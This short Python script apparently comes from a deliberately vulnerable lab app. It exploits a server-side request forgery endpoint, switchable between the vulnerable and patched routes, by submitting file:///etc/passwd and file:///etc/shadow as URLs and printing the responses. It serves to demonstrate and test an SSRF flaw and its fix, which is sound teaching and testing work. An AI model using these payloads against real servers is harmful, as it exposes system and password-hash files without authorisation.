import json
from urllib.error import URLError
from urllib.request import Request, urlopen

import cli


def main(use_vulnerable_endpoint: bool, url_prefix: str) -> None:
    if use_vulnerable_endpoint:
        url = f"{url_prefix}/vulnerabilities/ssrf2/submit_api_url/"
    else:
        url = f"{url_prefix}/patches/ssrf2/submit_api_url/"

    for custom_url in ["file:///etc/passwd", "file:///etc/shadow"]:
        data = {"url": custom_url}

        try:
            req = Request(
                url,
                data=json.dumps(data).encode("utf-8"),
                method="POST",
                headers={"Content-Type": "application/json"},
            )

            with urlopen(req) as response:
                print(f"Response for {custom_url}: {response.read().decode('utf-8')}")
        except URLError as e:
            print(f"Error with {custom_url}: {e}")


if __name__ == "__main__":
    use_vulnerable_endpoint, url_prefix = cli.get_cli_arguments()
    main(use_vulnerable_endpoint, url_prefix)
